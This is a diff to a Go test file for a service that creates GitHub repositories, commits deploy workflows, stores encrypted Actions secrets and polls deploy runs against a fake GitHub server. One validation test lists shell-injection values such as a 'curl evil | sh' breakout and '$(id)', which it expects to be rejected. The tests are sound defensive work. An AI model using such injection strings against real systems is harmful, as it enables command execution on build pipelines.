@@ -15,6 +15,10 @@ import (
 	"testing"
 	"time"
 
+	"crypto/rand"
+
+	"golang.org/x/crypto/nacl/box"
+
 	"anz-training/helper"
 	"anz-training/model"
 	"anz-training/service"
@@ -34,10 +38,23 @@ type fakeGitHub struct {
 	contentFails   int    // number of 404s before the contents PUT succeeds
 	prCreateStatus int    // override for POST /pulls
 	mergeStatus    int    // override for PUT /pulls/N/merge
+
+	// Actions secret encryption key pair; the test decrypts what the app sends
+	varBodies       []map[string]any
+	runs            []map[string]any // GET .../workflows/deploy.yml/runs (newest first)
+	jobs            []map[string]any // GET .../runs/{id}/jobs
+	annotations     []map[string]any // GET .../check-runs/{id}/annotations
+	secretKeyStatus int              // override for GET .../secrets/public-key
+	pubKey          *[32]byte
+	privKey         *[32]byte
 }
 
 func newFakeGitHub(t *testing.T) *fakeGitHub {
 	f := &fakeGitHub{t: t, bodies: map[string]map[string]any{}, accountType: "Organization"}
+	var err error
+	if f.pubKey, f.privKey, err = box.GenerateKey(rand.Reader); err != nil {
+		t.Fatal(err)
+	}
 	f.srv = httptest.NewServer(http.HandlerFunc(f.handle))
 	t.Cleanup(f.srv.Close)
 	return f
@@ -83,6 +100,25 @@ func (f *fakeGitHub) handle(w http.ResponseWriter, r *http.Request) {
 	case r.Method == "POST" && (r.URL.Path == "/orgs/acme/repos" || r.URL.Path == "/user/repos"):
 		name, _ := body["name"].(string)
 		f.reply(w, 201, map[string]string{"html_url": "https://github.com/acme/" + name, "default_branch": "main"})
+	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/actions/workflows/deploy.yml/runs"):
+		f.reply(w, 200, map[string]any{"workflow_runs": f.runs})
+	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/jobs"):
+		f.reply(w, 200, map[string]any{"jobs": f.jobs})
+	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/annotations"):
+		f.reply(w, 200, f.annotations)
+	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/actions/secrets/public-key"):
+		if f.secretKeyStatus != 0 {
+			f.reply(w, f.secretKeyStatus, map[string]string{"message": "Resource not accessible by personal access token"})
+			return
+		}
+		f.reply(w, 200, map[string]string{"key_id": "key-1", "key": base64.StdEncoding.EncodeToString(f.pubKey[:])})
+	case r.Method == "PUT" && strings.Contains(r.URL.Path, "/actions/secrets/"):
+		w.WriteHeader(http.StatusCreated)
+	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/actions/variables"):
+		f.mu.Lock()
+		f.varBodies = append(f.varBodies, body)
+		f.mu.Unlock()
+		w.WriteHeader(http.StatusCreated)
 	case r.Method == "PUT" && strings.Contains(r.URL.Path, "/contents/"):
 		f.mu.Lock()
 		fail := f.contentFails > 0
@@ -172,21 +208,18 @@ func TestGitHub_ServiceName(t *testing.T) {
 }
 
 func TestGitHub_RenderDeployWorkflow(t *testing.T) {
-	d := service.DeployData{
-		BranchName: "main", WIFProvider: gcpCreds.WIFProvider, ServiceAccount: gcpCreds.ServiceAccount,
-		Region: "asia-southeast1", GCPProjectID: "my-proj", ArtifactRepo: "ai-apps", ServiceName: "svc-1",
-		WebhookURL: "https://b.example.com/hook", WebhookSecret: "sec", ProjectID: "proj-uuid",
-	}
+	d := service.DeployData{BranchName: "main", ServiceName: "svc-1", ProjectID: "proj-uuid"}
 	out, err := service.RenderDeployWorkflow(d)
 	if err != nil {
 		t.Fatal(err)
 	}
 	s := string(out)
 	for _, want := range []string{
-		"asia-southeast1-docker.pkg.dev/my-proj/ai-apps/svc-1:",
-		"workload_identity_provider: '" + gcpCreds.WIFProvider + "'",
+		"${GCP_REGION}-docker.pkg.dev/${GCP_PROJECT_ID}/${GCP_ARTIFACT_REPO}/svc-1:",
+		"workload_identity_provider: ${{ vars.GCP_WIF_PROVIDER }}",
+		"WEBHOOK_SECRET: ${{ secrets.WEBHOOK_SECRET }}",
 		`"project_id":"proj-uuid"`, // our id, not the GCP project
-		"X-Webhook-Secret: sec", "paths-ignore",
+		`X-Webhook-Secret: $WEBHOOK_SECRET`, "paths-ignore",
 	} {
 		if !strings.Contains(s, want) {
 			t.Errorf("workflow missing %q", want)
@@ -202,9 +235,9 @@ func TestGitHub_RenderDeployWorkflow(t *testing.T) {
 	// values that could break out of the YAML/shell quoting are rejected
 	for _, bad := range []string{"x' ; curl evil | sh #", "a b", "x\ny", "$(id)", "`id`", ""} {
 		d2 := d
-		d2.ServiceAccount = bad
+		d2.ServiceName = bad
 		if _, err := service.RenderDeployWorkflow(d2); err == nil {
-			t.Errorf("ServiceAccount %q should be rejected", bad)
+			t.Errorf("ServiceName %q should be rejected", bad)
 		}
 	}
 }
@@ -230,7 +263,7 @@ func TestGitHub_CreateRepo_Org(t *testing.T) {
 		t.Fatalf("workflow commit = %#v", put)
 	}
 	raw, _ := base64.StdEncoding.DecodeString(put["content"].(string))
-	if !strings.Contains(string(raw), "my-app-1234abcd:") || !strings.Contains(string(raw), helper.WebhookSecretFor("whsec_abc123", "1234abcd-0000-4000-8000-000000000000")) ||
+	if !strings.Contains(string(raw), "my-app-1234abcd:") ||
 		!strings.Contains(string(raw), `"project_id":"1234abcd-0000-4000-8000-000000000000"`) {
 		t.Fatalf("workflow content wrong:\n%s", raw)
 	}
@@ -318,24 +351,33 @@ func write(t *testing.T, path, content string) {
 	}
 }
 
-// seedRemote creates <root>/acme/repo.git with a main branch holding a README
-// and the trusted deploy workflow, like CreateRepo leaves it.
-func seedRemote(t *testing.T) (root string) {
+// seedRemoteFiles creates <root>/acme/repo.git with a main branch holding the given files
+// and returns root, to be used as the git URL base (file://<root>).
+func seedRemoteFiles(t *testing.T, files map[string]string) (root string) {
 	t.Helper()
 	root = t.TempDir()
-	bare := filepath.Join(root, "acme", "repo.git")
+	bare := bareRepo(root)
 	if err := os.MkdirAll(bare, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	gitCmd(t, bare, "init", "-q", "--bare", "--initial-branch=main")
 	seed := t.TempDir()
 	gitCmd(t, seed, "init", "-q", "--initial-branch=main")
-	write(t, filepath.Join(seed, "README.md"), "# repo\n")
-	write(t, filepath.Join(seed, ".github/workflows/deploy.yml"), "TRUSTED\n")
+	for name, content := range files {
+		write(t, filepath.Join(seed, name), content)
+	}
 	gitCmd(t, seed, "add", "-A")
 	gitCmd(t, seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init")
 	gitCmd(t, seed, "push", "-q", bare, "main")
 	return root
+}
+
+func bareRepo(root string) string { return filepath.Join(root, "acme", "repo.git") }
+
+// seedRemote is a remote like CreateRepo leaves it: a README and the trusted deploy workflow.
+func seedRemote(t *testing.T) (root string) {
+	t.Helper()
+	return seedRemoteFiles(t, map[string]string{"README.md": "# repo\n", ".github/workflows/deploy.yml": "TRUSTED\n"})
 }
 
 func TestGitHub_PushAndOpenPR(t *testing.T) {
@@ -425,5 +467,278 @@ func TestGitHub_PushAndOpenPR_ExistingPRAndGuards(t *testing.T) {
 	if _, err := g.PushAndOpenPR(ctx, same, ghCreds, "https://github.com/acme/repo", "main"); err == nil ||
 		!strings.Contains(err.Error(), "nothing to commit") {
 		t.Fatalf("want nothing-to-commit error, got %v", err)
+	}
+}
+
+// A repo created without a deploy workflow (no GCP) has no .github on main.
+func TestGitHub_PushAndOpenPR_NoWorkflowOnBase(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not installed")
+	}
+	f := newFakeGitHub(t)
+	root := seedRemoteFiles(t, map[string]string{"README.md": "# repo\n"})
+
+	ws := t.TempDir()
+	write(t, filepath.Join(ws, "main.go"), "package main\n")
+	write(t, filepath.Join(ws, ".github/workflows/evil.yml"), "EVIL\n") // generated CI is never trusted
+	g := newGH(t, f, "file://"+root)
+	if _, err := g.PushAndOpenPR(context.Background(), ws, ghCreds, "https://github.com/acme/repo", "main"); err != nil {
+		t.Fatal(err)
+	}
+	if out := gitCmd(t, bareRepo(root), "ls-tree", "-r", "--name-only", "feature/ai-gen"); !strings.Contains(out, "main.go") || strings.Contains(out, "evil.yml") {
+		t.Fatalf("pushed tree:\n%s", out)
+	}
+}
+
+func TestGitHub_DispatchWorkflow(t *testing.T) {
+	f := newFakeGitHub(t)
+	g := newGH(t, f, "")
+	ctx := context.Background()
+	if err := g.DispatchWorkflow(ctx, ghCreds, "https://github.com/acme/repo", "deploy.yml", "main"); err != nil {
+		t.Fatal(err)
+	}
+	sig := "POST /repos/acme/repo/actions/workflows/deploy.yml/dispatches"
+	if !f.called(sig) {
+		t.Fatalf("calls = %v", f.calls)
+	}
+	if f.bodies[sig]["ref"] != "main" {
+		t.Fatalf("body = %v", f.bodies[sig])
+	}
+
+	before := len(f.calls)
+	if err := g.DispatchWorkflow(ctx, ghCreds, "https://github.com/evil/repo", "deploy.yml", "main"); err == nil {
+		t.Fatal("foreign repo must be refused")
+	}
+	if len(f.calls) != before {
+		t.Fatal("GitHub was called for a foreign repo")
+	}
+	if err := g.DispatchWorkflow(ctx, model.GitHubCreds{Owner: "acme"}, "https://github.com/acme/repo", "deploy.yml", "main"); err == nil {
+		t.Fatal("missing token must fail")
+	}
+}
+
+func TestGitHub_CreateRepo_CommitsIaC(t *testing.T) {
+	f := newFakeGitHub(t)
+	g := newGH(t, f, "")
+	creds := gcpCreds
+	creds.RuntimeServiceAccount = runtimeSA
+	if _, err := g.CreateRepo(context.Background(), ghCreds, creds, "1234abcd-0000-4000-8000-000000000000", "My App"); err != nil {
+		t.Fatal(err)
+	}
+	wf := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
+	sv := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/service.yml"]
+	if wf == nil || sv == nil {
+		t.Fatalf("both files must be committed, calls: %v", f.calls)
+	}
+	for name, put := range map[string]map[string]any{"workflow": wf, "service.yml": sv} {
+		if msg, _ := put["message"].(string); !strings.HasSuffix(msg, "[skip ci]") {
+			t.Errorf("%s commit message %q must end with [skip ci]", name, msg)
+		}
+	}
+	raw, _ := base64.StdEncoding.DecodeString(sv["content"].(string))
+	if !strings.Contains(string(raw), "name: my-app-1234abcd") || !strings.Contains(string(raw), "serviceAccountName: "+runtimeSA) {
+		t.Fatalf("service.yml content:\n%s", raw)
+	}
+
+	// no GCP config (repo-only / demo): no deploy files
+	f2 := newFakeGitHub(t)
+	if _, err := newGH(t, f2, "").CreateRepo(context.Background(), ghCreds, gcpEmpty, "id-1", "x"); err != nil {
+		t.Fatal(err)
+	}
+	for _, c := range f2.calls {
+		if strings.HasPrefix(c, "PUT ") {
+			t.Fatalf("no files expected without GCP config, got %s", c)
+		}
+	}
+}
+
+func TestGitHub_PushAndOpenPR_RestoresServiceYML(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not installed")
+	}
+	root := seedRemoteFiles(t, map[string]string{"README.md": "# repo\n", "service.yml": "TRUSTED\n"})
+
+	ws := t.TempDir()
+	write(t, filepath.Join(ws, "main.go"), "package main\n")
+	write(t, filepath.Join(ws, "service.yml"), "EVIL: expose everything\n") // generated code must not change IaC
+	g := newGH(t, newFakeGitHub(t), "file://"+root)
+	if _, err := g.PushAndOpenPR(context.Background(), ws, ghCreds, "https://github.com/acme/repo", "main"); err != nil {
+		t.Fatal(err)
+	}
+	if got := gitCmd(t, bareRepo(root), "show", "feature/ai-gen:service.yml"); strings.TrimSpace(got) != "TRUSTED" {
+		t.Fatalf("service.yml on the PR branch = %q", got)
+	}
+}
+
+// The deploy workflow must hold no config literal and no secret: GCP settings are
+// repo variables and the webhook secret is an encrypted Actions secret.
+func TestGitHub_CreateRepo_ConfiguresActionsVarsAndSecret(t *testing.T) {
+	f := newFakeGitHub(t)
+	g := newGH(t, f, "")
+	const projectID = "1234abcd-0000-4000-8000-000000000000"
+	if _, err := g.CreateRepo(context.Background(), ghCreds, gcpCreds, projectID, "My App"); err != nil {
+		t.Fatal(err)
+	}
+	base := "/repos/acme/my-app-1234abcd/actions/"
+
+	got := map[string]string{}
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	for _, v := range f.varBodies {
+		got[v["name"].(string)] = v["value"].(string)
+	}
+	want := map[string]string{
+		"GCP_PROJECT_ID": gcpCreds.ProjectID, "GCP_REGION": gcpCreds.Region, "GCP_ARTIFACT_REPO": gcpCreds.ArtifactRepo,
+		"GCP_WIF_PROVIDER": gcpCreds.WIFProvider, "GCP_SERVICE_ACCOUNT": gcpCreds.ServiceAccount,
+		"WEBHOOK_URL": "https://builder.example.com/api/webhooks/github",
+	}
+	for k, v := range want {
+		if got[k] != v {
+			t.Errorf("variable %s = %q, want %q", k, got[k], v)
+		}
+	}
+
+	sec := f.bodies["PUT "+base+"secrets/WEBHOOK_SECRET"]
+	if sec == nil || sec["key_id"] != "key-1" {
+		t.Fatalf("webhook secret not stored: %#v", sec)
+	}
+	enc, _ := base64.StdEncoding.DecodeString(sec["encrypted_value"].(string))
+	plain, ok := box.OpenAnonymous(nil, enc, f.pubKey, f.privKey)
+	if !ok || string(plain) != helper.WebhookSecretFor("whsec_abc123", projectID) {
+		t.Fatalf("secret did not decrypt to the per-project webhook secret (ok=%v)", ok)
+	}
+
+	// nothing configurable or secret is committed in the workflow
+	put := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
+	raw, _ := base64.StdEncoding.DecodeString(put["content"].(string))
+	for _, lit := range []string{string(plain), gcpCreds.WIFProvider, gcpCreds.ServiceAccount, gcpCreds.ProjectID, "https://builder.example.com"} {
+		if strings.Contains(string(raw), lit) {
+			t.Errorf("workflow still contains literal %q", lit)
+		}
+	}
+}
+
+func TestGitHub_CreateRepo_ActionsSetupFailureFailsCreate(t *testing.T) {
+	f := newFakeGitHub(t)
+	f.secretKeyStatus = 403
+	if _, err := newGH(t, f, "").CreateRepo(context.Background(), ghCreds, gcpCreds, "id-1", "x"); err == nil {
+		t.Fatal("a repo without its deploy secret would fail silently later; CreateRepo must return the error")
+	}
+}
+
+// ---- reading the deploy run (polling instead of a webhook) ----
+
+func step(name, status, conclusion string) map[string]any {
+	return map[string]any{"name": name, "status": status, "conclusion": conclusion}
+}
+
+func runAt(id int, created time.Time, status, conclusion string) map[string]any {
+	return map[string]any{"id": id, "status": status, "conclusion": conclusion, "created_at": created.UTC().Format(time.RFC3339)}
+}
+
+func watchRun(t *testing.T, f *fakeGitHub, since time.Time) service.DeployRun {
+	t.Helper()
+	run, err := newGH(t, f, "").DeployRun(context.Background(), ghCreds, "https://github.com/acme/my-app-1234abcd", since)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return run
+}
+
+func TestGitHub_DeployRun_SuccessReadsTheLiveURLAnnotation(t *testing.T) {
+	f := newFakeGitHub(t)
+	created := time.Unix(2000, 0).UTC()
+	f.runs = []map[string]any{runAt(11, created, "completed", "success")}
+	f.jobs = []map[string]any{{"id": 99, "steps": []map[string]any{
+		step("Set up job", "completed", "success"), step("Build", "completed", "success"),
+		step("Test", "completed", "success"), step("Deploy", "completed", "success"),
+	}}}
+	f.annotations = []map[string]any{
+		{"title": "other", "message": "noise"},
+		{"title": "live_url", "message": "https://my-app-1234abcd-386127327935.asia-southeast1.run.app"},
+	}
+	run := watchRun(t, f, time.Unix(1500, 0))
+	want := service.DeployRun{Found: true, CreatedAt: created, Done: true, Conclusion: "success", Step: "deploying",
+		LiveURL: "https://my-app-1234abcd-386127327935.asia-southeast1.run.app"}
+	if run != want {
+		t.Fatalf("run = %+v, want %+v", run, want)
+	}
+}
+
+func TestGitHub_DeployRun_ProgressAndFailure(t *testing.T) {
+	cases := []struct {
+		name  string
+		steps []map[string]any
+		runSt string
+		concl string
+		want  service.DeployRun
+	}{
+		{"queued", nil, "queued", "", service.DeployRun{Found: true}},
+		{"building", []map[string]any{step("Build", "in_progress", ""), step("Test", "pending", ""), step("Deploy", "pending", "")},
+			"in_progress", "", service.DeployRun{Found: true, Step: "building"}},
+		{"testing", []map[string]any{step("Build", "completed", "success"), step("Test", "in_progress", ""), step("Deploy", "pending", "")},
+			"in_progress", "", service.DeployRun{Found: true, Step: "testing"}},
+		{"test fails", []map[string]any{step("Build", "completed", "success"), step("Test", "completed", "failure"), step("Deploy", "completed", "skipped")},
+			"completed", "failure", service.DeployRun{Found: true, Done: true, Conclusion: "failure", Step: "testing", FailedStage: "test"}},
+		{"setup fails", []map[string]any{step("Set up job", "completed", "failure"), step("Build", "completed", "skipped")},
+			"completed", "failure", service.DeployRun{Found: true, Done: true, Conclusion: "failure"}},
+	}
+	for _, tc := range cases {
+		f := newFakeGitHub(t)
+		f.runs = []map[string]any{runAt(1, time.Unix(2000, 0), tc.runSt, tc.concl)}
+		f.jobs = []map[string]any{{"id": 5, "steps": tc.steps}}
+		tc.want.CreatedAt = time.Unix(2000, 0).UTC()
+		if got := watchRun(t, f, time.Unix(1500, 0)); got != tc.want {
+			t.Errorf("%s: run = %+v, want %+v", tc.name, got, tc.want)
+		}
+	}
+}
+
+func TestGitHub_DeployRun_OnlyRunsCreatedSince(t *testing.T) {
+	f := newFakeGitHub(t)
+	f.runs = []map[string]any{runAt(2, time.Unix(2000, 0), "in_progress", ""), runAt(1, time.Unix(1000, 0), "completed", "success")}
+	f.jobs = []map[string]any{{"id": 5, "steps": []map[string]any{}}}
+	if run := watchRun(t, f, time.Unix(1500, 0)); !run.Found || !run.CreatedAt.Equal(time.Unix(2000, 0)) {
+		t.Fatalf("want the newer run, got %+v", run)
+	}
+	// an old run (a previous deploy) is not this deploy's
+	if run := watchRun(t, f, time.Unix(3000, 0)); run.Found {
+		t.Fatalf("a run older than since must be ignored: %+v", run)
+	}
+	if f.called("GET /repos/acme/my-app-1234abcd/actions/runs/2/jobs") == false {
+		t.Fatal("jobs of the chosen run were not read")
+	}
+}
+
+func TestGitHub_DeployRun_SuccessWithoutAnnotationHasNoURL(t *testing.T) {
+	f := newFakeGitHub(t)
+	f.runs = []map[string]any{runAt(1, time.Unix(2000, 0), "completed", "success")}
+	f.jobs = []map[string]any{{"id": 5, "steps": []map[string]any{step("Deploy", "completed", "success")}}}
+	if run := watchRun(t, f, time.Unix(1500, 0)); !run.Done || run.LiveURL != "" {
+		t.Fatalf("run = %+v", run)
+	}
+}
+
+// Polling mode: with no webhook configured the repo gets no webhook variable or secret.
+func TestGitHub_CreateRepo_NoWebhookConfigured(t *testing.T) {
+	f := newFakeGitHub(t)
+	g := service.NewGitHub(service.GitHubConfig{APIURL: f.srv.URL, RetryDelay: time.Millisecond})
+	if _, err := g.CreateRepo(context.Background(), ghCreds, gcpCreds, "1234abcd-0000-4000-8000-000000000000", "My App"); err != nil {
+		t.Fatal(err)
+	}
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	for _, v := range f.varBodies {
+		if v["name"] == "WEBHOOK_URL" {
+			t.Error("WEBHOOK_URL must not be set in polling mode")
+		}
+	}
+	if len(f.varBodies) != 5 {
+		t.Errorf("want the 5 GCP variables, got %d", len(f.varBodies))
+	}
+	for _, c := range f.calls {
+		if strings.Contains(c, "/secrets/") {
+			t.Errorf("no secret expected without a webhook, got %s", c)
+		}
 	}
 }
